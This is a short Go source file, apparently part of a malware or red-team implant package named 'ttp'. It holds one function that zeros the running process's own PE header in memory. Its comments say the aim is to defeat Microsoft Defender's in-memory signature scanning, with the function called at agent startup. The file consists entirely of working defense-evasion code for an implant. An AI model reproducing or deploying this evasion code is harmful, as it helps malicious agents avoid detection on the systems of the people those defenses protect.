package ttp

import (
	"unsafe"
)

// ErasePEHeader zeros the first 4096 bytes of the process image (the PE header).
// Defeats Defender's in-memory PE signature scan -- call once at agent startup.
func ErasePEHeader() {
	procGetModuleHandleA := kernel32.NewProc("GetModuleHandleA")
	procVirtualProtect := kernel32.NewProc("VirtualProtect")

	// NULL argument = own process image base
	base, _, _ := procGetModuleHandleA.Call(0)
	if base == 0 {
		return
	}

	var oldProt uint32
	procVirtualProtect.Call(base, 0x1000, 0x40, uintptr(unsafe.Pointer(&oldProt))) // PAGE_EXECUTE_READWRITE

	hdr := (*[0x1000]byte)(unsafe.Pointer(base))
	for i := range hdr {
		hdr[i] = 0
	}

	procVirtualProtect.Call(base, 0x1000, uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
}
